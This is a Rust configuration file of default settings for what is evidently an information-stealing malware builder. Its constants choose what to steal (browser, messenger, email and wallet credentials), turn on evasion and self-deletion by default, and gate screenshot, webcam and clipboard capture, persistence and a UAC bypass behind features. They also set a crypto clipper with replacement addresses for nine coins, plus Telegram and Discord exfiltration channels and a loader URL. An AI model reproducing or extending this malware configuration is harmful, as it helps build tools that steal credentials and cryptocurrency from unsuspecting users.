use crate::recovery::task::RecoveryCategory;

#[allow(dead_code)]
pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[
    RecoveryCategory::Browsers,
    RecoveryCategory::Messengers,
    RecoveryCategory::EmailClients,
    RecoveryCategory::Wallets,
    RecoveryCategory::System,
    RecoveryCategory::Other,
]);
#[allow(dead_code)]
pub static DEFAULT_ARTIFACT_KEY: Option<&str> = None;
#[cfg(feature = "screenshot")]
#[allow(dead_code)]
pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
#[cfg(feature = "webcam")]
#[allow(dead_code)]
pub static DEFAULT_CAPTURE_WEBCAMS: bool = false;
#[cfg(feature = "clipboard")]
#[allow(dead_code)]
pub static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
#[cfg(feature = "persistence")]
#[allow(dead_code)]
pub static DEFAULT_PERSISTENCE: bool = false;
#[cfg(feature = "uac")]
#[allow(dead_code)]
pub static DEFAULT_UAC_BYPASS: bool = false;
#[cfg(feature = "evasion")]
#[allow(dead_code)]
pub static DEFAULT_EVASION_ENABLED: bool = true;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_CLIPPER_ENABLED: bool = false;
#[cfg(feature = "melt")]
#[allow(dead_code)]
pub static DEFAULT_MELT_ENABLED: bool = true;
#[allow(dead_code)]
pub static DEFAULT_DEBUG_ENABLED: bool = false;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_BTC_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_ETH_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_LTC_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_XMR_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_DOGE_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_DASH_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_SOL_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_TRX_ADDRESS: Option<&str> = None;
#[cfg(feature = "clipper")]
#[allow(dead_code)]
pub static DEFAULT_ADA_ADDRESS: Option<&str> = None;
#[allow(dead_code)]
pub static DEFAULT_PUMP_SIZE_MB: u32 = 0;
#[allow(dead_code)]
pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = None;
#[allow(dead_code)]
pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = None;
#[allow(dead_code)]
pub static DEFAULT_CUSTOM_KEYWORDS: Option<&[&str]> = None;
#[allow(dead_code)]
pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = None;
#[allow(dead_code)]
pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = None;
#[allow(dead_code)]
pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = None;
#[allow(dead_code)]
pub static DEFAULT_LOADER_URL: Option<&str> = None;
#[allow(dead_code)]
pub static DEFAULT_PROXY_SERVER: Option<&str> = None;
